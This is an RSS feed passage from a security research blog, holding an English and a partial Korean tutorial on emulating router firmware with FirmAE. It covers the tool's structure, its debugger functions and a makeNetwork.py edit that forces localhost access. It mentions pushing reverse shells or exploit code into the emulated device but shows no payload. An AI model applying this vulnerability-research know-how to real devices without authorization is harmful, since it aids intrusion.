      <category domain="https://hackyboiz.github.io/tags/cve-2025-32463/">cve-2025-32463</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/12/poosic/cve-2025-32463/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Firmware Emulation with FirmAE Part 2 (en)</title>
      <link>https://hackyboiz.github.io/2025/07/10/newp1ayer48/emulation2/en/</link>
      <guid>https://hackyboiz.github.io/2025/07/10/newp1ayer48/emulation2/en/</guid>
      <pubDate>Thu, 10 Jul 2025 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;After a</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p>After a long time, I&#x2019;ve safely(?) returned with <strong>Firmware Emulation with FirmAE Part 2</strong>!</p><p><img src="image001.jpg" alt="image001.jpg"></p><p>FirmAE is a convenient tool that automates firmware emulation! Emulating and dynamically analyzing firmware is a great way to find vulnerabilities! For emulation basics and FirmAE installation, please refer to the previous article, <a href="https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/">Firmware Emulation with FirmAE Part 1</a>.<br>Continuing from the last post, this article will cover FirmAE&#x2019;s structure, execution, and how to resolve IP issues should they arise. &#x1F64C;&#x1F3FB;</p><h2 id="1-FirmAE-Structure"><a href="#1-FirmAE-Structure" class="headerlink" title="1. FirmAE Structure"></a>1. FirmAE Structure</h2><p>The main directories and files of FirmAE are structured as follows.</p><div class="table-container"><table><thead><tr><th>Directories &amp; Files</th><th>Explanation</th></tr></thead><tbody><tr><td><code>FirmAE/analyses/</code></td><td>This is the location where files and logs related to the <code>analyses</code> mode of <code>run.sh</code> are stored.</td></tr><tr><td><code>FirmAE/firmwares/</code></td><td>This is where you place the firmware (<code>.bin</code>) for analysis.</td></tr><tr><td><code>FirmAE/images/</code></td><td>This is where the OS images for emulation are located.</td></tr><tr><td><code>FirmAE/scratch/</code></td><td>For each emulation run, a subdirectory is created with an IID (Image ID), which stores all intermediate outputs and results for that specific run, including the extracted file system, kernel, generated disk image, and logs. The subdirectory is created in the format <code>FirmAE/scratch/{IID}</code>.</td></tr><tr><td><code>FirmAE/scripts/</code></td><td>This is where the various sub-scripts called by the main scripts are located.</td></tr><tr><td><code>FirmAE/scripts/makeNetwork.py</code></td><td>It is responsible for dynamically analyzing the firmware&#x2019;s network behavior, and then generating the final QEMU execution script <code>FirmAE/scratch/{IID}/run.sh</code> passing the relevant network settings to it.</td></tr><tr><td><code>FirmAE/sources/scraper/firmware/spiders/</code></td><td>This is the directory where files corresponding to the <code>&lt;brand&gt;</code> argument, required for executing <code>run.sh</code>, are located. If this name is not found or if the brand name is to be extracted automatically, the process is handled by the <code>get_brand()</code> function in <code>scripts/util.py</code>.</td></tr><tr><td><code>FirmAE/run.sh</code></td><td>This is the main execution script, and it supports five modes by default.</td></tr></tbody></table></div><p>The 5 modes of <code>FirmAE/run.sh</code> are as follows.</p><div class="table-container"><table><thead><tr><th><code>-c</code>(check)</th><th>This is the mode for checking network/web connectivity. It is common practice to run this check before starting the emulation.</th></tr></thead><tbody><tr><td><code>-r</code>(run)</td><td>This is the mode for running the emulation.</td></tr><tr><td><code>-d</code>(debug)</td><td>You can emulate the firmware in debug mode.</td></tr><tr><td><code>-b</code>(boot debug mode)</td><td>This is a mode that allows for debugging at the kernel-level, starting right from the boot process.</td></tr><tr><td><code>-a</code>(analyze)</td><td>This is the vulnerability analysis mode. It runs predefined attacks targeting web services to find potential vulnerabilities. The analysis results can be found in <code>analyses/</code> and <code>scratch/{IID}/result</code>.</td></tr></tbody></table></div><p><img src="image002.jpg" alt="image002.jpg"></p><p>There are many other files, of course&#x2026; &#x1F62E; but since there&#x2019;s a limit to what we can cover, I&#x2019;ve only introduced the ones I deemed important.<br>Among these, the most important files and folders you&#x2019;ll frequently interact with can be summarized below.</p><ul><li><code>scripts/makeNetwork.py</code></li><li><code>run.sh</code></li><li><code>scratch/</code></li></ul><p>While other files also play a role, you can think of FirmAE&#x2019;s main workflow like this: <code>run.sh</code> is executed with reference to the settings in <code>scripts/makeNetwork.py</code>, and the corresponding emulation images and files are generated in the <code>scratch/</code> directory.<br>All logs generated during the emulation process exist within <code>scratch/</code>, so you can also check the log information to diagnose any problems that occur after execution! &#x1F50D;</p><h2 id="2-FirmAE-Execution-and-the-FirmAE-Debugger"><a href="#2-FirmAE-Execution-and-the-FirmAE-Debugger" class="headerlink" title="2. FirmAE Execution and the FirmAE Debugger"></a>2. FirmAE Execution and the FirmAE Debugger</h2><p>Once you&#x2019;ve completed the network and emulation check with the <code>-c Check</code> option, it&#x2019;s time to run the emulation.<br>You can use various options for emulation depending on your needs and purpose. If you&#x2019;re unsure, it&#x2019;s best to use the <code>-d</code> option to perform debugging in debug mode.</p><p><img src="image003.png" alt="image003.png"></p><p>If the emulation works correctly, you&#x2019;ll see the FirmAE Debugger screen as above! &#x1F389; Now let&#x2019;s look at the features of the FirmAE Debugger while the emulation is running. There are five main functions.</p><ul><li><p>connect to socat<strong>:</strong> This provides access through a python <code>socat</code>. Even if you don&#x2019;t use this first function, if the <code>netcat</code> connection is successful, you can access the virtual device&#x2019;s web page using the generated address and port! &#x1F310;</p></li><li><p>connect to shell<strong>:</strong> This function allows you to connect to and control the emulated virtual device via a shell!<br>You can use Linux commands defined in the firmware, such as <code>busybox</code>. This enables dynamic analysis and testing within the device. &#x1F9EA;</p></li></ul><p><img src="image004.png" alt="image004.png"></p><ul><li>tcpdump<strong>:</strong> You can analyze the created virtual network interface with <code>tcpdump</code>. &#x2709;&#xFE0F; The command shown cannot be modified, so analysis is only possible on the generated interface.</li></ul><p><img src="image005.png" alt="image005.png"></p><ul><li><p>run gdbserver<strong>:</strong> This opens a gdb server inside the virtual device to provide dynamic analysis.<br>Some preparation is needed to use this feature. Since embedded device firmware mostly uses RISC architectures like ARM or MIPS, standard gdb often fails to recognize the transmitted and received data. &#x26A0;&#xFE0F; Therefore, you must connect to the gdb server through <code>gdb-multiarch</code>.</p>  <pre><code class="hljs bash">sudo apt-get install gdb-multiarchgdb-multiarch<span class="hljs-built_in">set</span> sysroot<span class="hljs-built_in">set</span> follow-fork-mode child<span class="hljs-built_in">set</span> solib-search-path PATHtarget remote IP:PORT</code></pre><p>  After installation, run <code>gdb-multiarch</code> and apply a few settings as shown above. You can register the firmware <code>lib</code> address, previously extracted using binwalk, as the <code>PATH</code>. &#x1F4D6;<br>  You can confirm the connection is successful by connecting to the gdb server targeting the example firmware process PID. If you apply this to a web service process like <code>httpd</code>, you can debug the functions of that web page.</p><p>  <img src="image006.png" alt="image006.png"></p></li><li><p>file transfer<strong>:</strong> You can transfer files from your local machine to the virtual device.<br>The path where the transferred file is saved is located within the <code>firmadyne/</code> directory created inside the firmware. The reason for this is defined in <code>file_transfer()</code> within <code>FirmAE/debug.py</code>. Since you can transfer files to the virtual device, you can push in programs like a reverse shell or transfer configuration files like <code>xinetd.conf</code> or <code>sshd_config</code>. &#x2708;&#xFE0F; If necessary, you can also transfer exploit code and related files for testing.</p><p>  <img src="image007.png" alt="image007.png"></p></li></ul><h2 id="3-How-to-Solve-IP-and-Network-Problems"><a href="#3-How-to-Solve-IP-and-Network-Problems" class="headerlink" title="3. How to Solve IP and Network Problems"></a>3. How to Solve IP and Network Problems</h2><p>FirmAE sets up the network and runs the emulation based on the IP address configured in the device firmware. However, for various reasons&#x2014;such as the IP not being set in the firmware or the device only allowing <code>localhost</code> access&#x2014;the FirmAE emulation often fails to work. &#x1F62D;</p><p><img src="image008.jpg" alt="image008.jpg"></p><p>This problem has several causes and solutions. Here, I&#x2019;ll introduce how to solve it by modifying <code>scripts/makeNetwork.py</code>.<br>When the default network configuration (bridge mode) fails, FirmAE has a feature to automatically switch to an alternative network method (QEMU user mode) to continue the emulation. &#x1F6B8; When this automatic switch occurs, the access environment is configured as <code>localhost</code>. Since the firmware in the picture below is such a case, you can see that the access environment is configured as <code>localhost</code>.</p><p><img src="image009.png" alt="image009.png"></p><p>This happens where the network bridge settings for QEMU emulation are adjusted via the <code>QEMU_NET_OPTS</code> variable in <code>scratch/{IID}/run.sh</code>.<br>As explained earlier in the FirmAE structure section, the <code>scratch/{IID}</code> folder and its files are created by <code>scripts/makeNetwork.py</code>, which also handles network settings. Therefore, by modifying this Python script, you can force the emulation to always open with <code>localhost</code>. &#x1F513;</p><ul><li><p>Modifying scripts/makeNetwork.py</p>  <pre><code class="hljs bash">cp scripts/makeNetwork.py scripts/makeNetwork.py.bak</code></pre><p>  First, back up the original file.</p>  <pre><code class="hljs python">isUserNetwork = any(isDhcpIp(ip) <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ips)<span class="hljs-keyword">with</span> open(SCRATCHDIR + <span class="hljs-string">&quot;/&quot;</span> + str(iid) + <span class="hljs-string">&quot;/isDhcp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> out:</code></pre>  <pre><code class="hljs python"><span class="hljs-comment"># isUserNetwork = any(isDhcpIp(ip) for ip in ips)</span>isUserNetwork = <span class="hljs-literal">True</span><span class="hljs-keyword">with</span> open(SCRATCHDIR + <span class="hljs-string">&quot;/&quot;</span> + str(iid) + <span class="hljs-string">&quot;/isDhcp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> out:</code></pre><p>  Modify the IP setting part from the first code block to the second.</p>  <pre><code class="hljs python">portfwd = <span class="hljs-string">&quot;hostfwd=tcp::80-:80,hostfwd=tcp::443-:443,&quot;</span><span class="hljs-keyword">for</span> (proto, ip, port) <span class="hljs-keyword">in</span> ports:</code></pre>  <pre><code class="hljs python">portfwd = <span class="hljs-string">&quot;hostfwd=tcp::8888-:80,&quot;</span><span class="hljs-comment"># portfwd = &quot;hostfwd=tcp::80-:80,hostfwd=tcp::443-:443,&quot;</span><span class="hljs-keyword">for</span> (proto, ip, port) <span class="hljs-keyword">in</span> ports:</code></pre><p>  Also, modify the port setting part from the first code block to the second.</p></li></ul><p><img src="image010.png" alt="image010.png"></p><p>After modifying the file and running it, you can see that the IP changes to <code>localhost</code>! &#x1F44D;&#x1F3FB;</p><p>This method might not be a fundamental solution, as it only changes the network settings. If it still doesn&#x2019;t work, it&#x2019;s best to analyze the firmware directly to match the network settings precisely. As mentioned before, all logs from the emulation process are in <code>scratch/{IID}/</code>, so analyzing the logs is another good way to solve problems.<br>Emulating directly through QEMU is also recommended! As those who have used it know, FirmAE is really slow&#x2026;</p><p><img src="image011.png" alt="image011.png"></p><p>Although FirmAE is slow, it is definitely a useful tool if you use it well! I hope this article has been of some help to your firmware emulation efforts! &#x1F64F;&#x1F3FB;<br>I&#x2019;ll be back with another embedded topic next time! Thank you! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Emulation/">Emulation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/10/newp1ayer48/emulation2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Firmware Emulation with FirmAE Part 2 (ko)</title>
      <link>https://hackyboiz.github.io/2025/07/10/newp1ayer48/emulation2/ko/</link>
      <guid>https://hackyboiz.github.io/2025/07/10/newp1ayer48/emulation2/ko/</guid>
      <pubDate>Thu, 10 Jul 2025 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p>&#xC624;&#xB79C;&#xB9CC;&#xC5D0; Firmware Emulation with FirmAE Part 2&#xB85C; &#xBB34;&#xC0AC;&#xD788;(?) &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="image001.jpg" alt="image001.jpg"></p><p>FirmAE&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC744; &#xC790;&#xB3D9;&#xD654; &#xD574;&#xC8FC;&#xB294; &#xD3B8;&#xB9AC;&#xD55C; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;! &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD558;&#xACE0; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xB354;&#xC6B1; &#xC88B;&#xC8E0;! &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xACFC; FirmAE &#xC124;&#xCE58;&#xB294; &#xC774;&#xC804; &#xAE00;&#xC778; <a href="https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/">Firmware Emulation with FirmAE Part 1</a>&#xC744; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p>&#xC800;&#xBC88; &#xAE00;&#xC5D0; &#xC774;&#xC5B4;&#xC11C; &#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; FirmAE&#xC758; &#xAD6C;&#xC131;&#xACFC; &#xC2E4;&#xD589;, &#xADF8;&#xB9AC;&#xACE0; IP &#xBB38;&#xC81C; &#xBC1C;&#xC0DD; &#xC2DC; &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xAE4C;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F64C;&#x1F3FB;</p><h2 id="1-FirmAE-&#xAD6C;&#xC131;"><a href="#1-FirmAE-&#xAD6C;&#xC131;" class="headerlink" title="1. FirmAE &#xAD6C;&#xC131;"></a>1. FirmAE &#xAD6C;&#xC131;</h2><p>FirmAE&#xC758; &#xC8FC;&#xC694; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC640; &#xD30C;&#xC77C;&#xC740; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F587;&#xFE0F;</p><div class="table-container"><table><thead><tr><th>&#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xBC0F; &#xD30C;&#xC77C;</th><th>&#xC124;&#xBA85;</th></tr></thead><tbody><tr><td><code>FirmAE/analyses/</code></td><td><code>run.sh</code> &#xC2E4;&#xD589; &#xBAA8;&#xB4DC; &#xC911; analyses &#xBAA8;&#xB4DC;&#xC758; &#xAD00;&#xB828;&#xB41C; &#xD30C;&#xC77C;&#xACFC; &#xB85C;&#xADF8;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACF3;&#xC785;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/firmwares/</code></td><td>&#xBD84;&#xC11D;&#xD560; &#xD38C;&#xC6E8;&#xC5B4;(<code>.bin</code>)&#xB97C; &#xC704;&#xCE58; &#xC2DC;&#xD0A4;&#xB294; &#xACF3;&#xC785;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/images/</code></td><td>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC704;&#xD55C; OS &#xC774;&#xBBF8;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACF3;&#xC785;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/scratch/</code></td><td>&#xAC01; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC2E4;&#xD589; &#xC2DC;, IID(Image ID)&#xB85C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xBA70;, &#xADF8; &#xC548;&#xC5D0;&#xB294; <strong>&#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;, &#xCEE4;&#xB110;, &#xC0DD;&#xC131;&#xB41C; &#xB514;&#xC2A4;&#xD06C; &#xC774;&#xBBF8;&#xC9C0;, &#xB85C;&#xADF8; &#xB4F1; &#xD574;&#xB2F9; &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xD55C; &#xBAA8;&#xB4E0; &#xC911;&#xAC04; &#xC0B0;&#xCD9C;&#xBB3C;&#xACFC; &#xACB0;&#xACFC;&#xAC00; &#xC800;&#xC7A5;</strong>&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; <code>FirmAE/scratch/{IID}</code> &#xD615;&#xD0DC;&#xB85C; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/scripts/</code></td><td>&#xBA54;&#xC778; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC774; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC01;&#xC885; &#xD558;&#xC704; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACF3;&#xC785;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/scripts/makeNetwork.py</code></td><td>&#xD38C;&#xC6E8;&#xC5B4;&#xC758; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xB3D9;&#xC791;&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xACE0;, &#xAD00;&#xB828; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC124;&#xC815;&#xC744; &#xCD5C;&#xC885; QEMU &#xC2E4;&#xD589; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; <code>FirmAE/scratch/{IID}/run.sh</code>&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/sources/scraper/firmware/spiders/</code></td><td><code>run.sh</code> &#xC2E4;&#xD589;&#xC5D0; &#xD544;&#xC694;&#xD55C; <code>&lt;brand&gt;</code> &#xC778;&#xC790;&#xC5D0; &#xD574;&#xB2F9;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC785;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD574;&#xB2F9; &#xC774;&#xB984;&#xC774; &#xC5C6;&#xAC70;&#xB098; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xBE0C;&#xB79C;&#xB4DC; &#xC774;&#xB984;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xACBD;&#xC6B0; <code>scripts/util.py</code>&#xC5D0;&#xC11C; <code>get_brand()</code>&#xB97C; &#xD1B5;&#xD574; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>FirmAE/run.sh</code></td><td><strong>&#xBA54;&#xC778; &#xC2E4;&#xD589; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;</strong>&#xB85C;, &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; 5&#xAC00;&#xC9C0; &#xBAA8;&#xB4DC;&#xB97C; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</td></tr></tbody></table></div><p><code>FirmAE/run.sh</code> &#xC758; 5&#xAC00;&#xC9C0; &#xBAA8;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th><code>-c</code>(check)</th><th>&#xB124;&#xD2B8;&#xC6CC;&#xD06C;/&#xC6F9; &#xC811;&#xC18D; &#xAC00;&#xB2A5; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xBAA8;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. <strong>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC5D0; &#xC55E;&#xC11C; check &#xBAA8;&#xB4DC;&#xB85C; &#xD655;&#xC778;</strong>&#xD558;&#xB294; &#xAC83;&#xC774; &#xC77C;&#xBC18;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</th></tr></thead><tbody><tr><td><code>-r</code>(run)</td><td>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBAA8;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>-d</code>(debug)</td><td>&#xB514;&#xBC84;&#xAE45; &#xBAA8;&#xB4DC;&#xB85C; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>-b</code>(boot debug mode)</td><td>kernel &#xC218;&#xC900;&#xC5D0;&#xC11C; &#xBD80;&#xD305; &#xB2E8;&#xACC4;&#xBD80;&#xD130; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</td></tr><tr><td><code>-a</code>(analyze)</td><td>&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xBAA8;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xC6F9; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xBAA9;&#xD45C;&#xB85C; &#xC0AC;&#xC804;&#xC5D0; &#xC815;&#xC758;&#xB41C; &#xACF5;&#xACA9;&#xB4E4;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xACE0; &#xBC1C;&#xC0DD; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xC11D; &#xACB0;&#xACFC;&#xB294; <code>analyses/</code>&#xC640; <code>scratch/{IID}/result</code>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</td></tr></tbody></table></div><p><img src="image002.jpg" alt="image002.jpg"></p><p>&#xC774;&#xC678;&#xC5D0;&#xB3C4; &#xD30C;&#xC77C;&#xC774; &#xC815;&#xB9D0; &#xB9CE;&#xC9C0;&#xB9CC;&#x2026; &#x1F62E; &#xC804;&#xBD80; &#xBCF4;&#xAE30;&#xC5D0;&#xB294; &#xD55C;&#xACC4;&#xAC00; &#xC788;&#xC73C;&#xB2C8;, &#xC911;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xB294; &#xAC83;&#xB9CC; &#xC18C;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC911;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xBCF4;&#xB294; &#xC911;&#xC694;&#xD55C; &#xD30C;&#xC77C;&#xACFC; &#xD3F4;&#xB354;&#xB294; &#xC544;&#xB798;&#xB85C; &#xC815;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>scripts/makeNetwork.py</code></li><li><code>run.sh</code></li><li><code>scratch/</code></li></ul><p>&#xB2E4;&#xB978; &#xD30C;&#xC77C;&#xB4E4;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0;&#xB9CC;, &#xD06C;&#xAC8C; <code>scripts/makeNetwork.py</code>&#xC758; &#xC124;&#xC815; &#xAC12;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xC5EC; <code>run.sh</code>&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>scratch/</code>&#xC5D0; &#xD574;&#xB2F9; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xC774;&#xBBF8;&#xC9C0;&#xC640; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xD750;&#xB984;&#xC73C;&#xB85C; FirmAE&#xAC00; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC758; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <strong>&#xBAA8;&#xB4E0; &#xB85C;&#xADF8;&#xB294; <code>scratch/</code> &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;</strong>&#xD558;&#xB2C8; &#xB85C;&#xADF8; &#xC815;&#xBCF4;&#xB3C4; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC2E4;&#xD589; &#xC774;&#xD6C4;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB3C4; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;! &#x1F50D;</p><h2 id="2-FirmAE-&#xC2E4;&#xD589;-&#xBC0F;-FirmAE-Debugger"><a href="#2-FirmAE-&#xC2E4;&#xD589;-&#xBC0F;-FirmAE-Debugger" class="headerlink" title="2. FirmAE &#xC2E4;&#xD589; &#xBC0F; FirmAE Debugger"></a>2. FirmAE &#xC2E4;&#xD589; &#xBC0F; FirmAE Debugger</h2><p><code>-c</code> Check &#xC635;&#xC158;&#xC73C;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xBC0F; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD655;&#xC778;&#xC774; &#xC644;&#xB8CC;&#xB418;&#xC5C8;&#xB2E4;&#xBA74;, &#xC774;&#xC81C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xD544;&#xC694;&#xC640; &#xC6A9;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xC635;&#xC158;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xB2E4;&#xBA74; <code>-d</code> &#xC635;&#xC158;&#xC73C;&#xB85C; debug &#xBAA8;&#xB4DC;&#xB85C; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image003.png" alt="image003.png"></p><p>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC774; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xBA74; &#xC704;&#xCC98;&#xB7FC; FirmAE Debugger &#xD654;&#xBA74;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#x1F389; &#xC774;&#xC81C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC774; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; FirmAE Debugger&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xB2A5;&#xC740; &#xD06C;&#xAC8C; 5&#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>connect to socat: python socat&#xC744; &#xD1B5;&#xD574; &#xC811;&#xC18D;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; 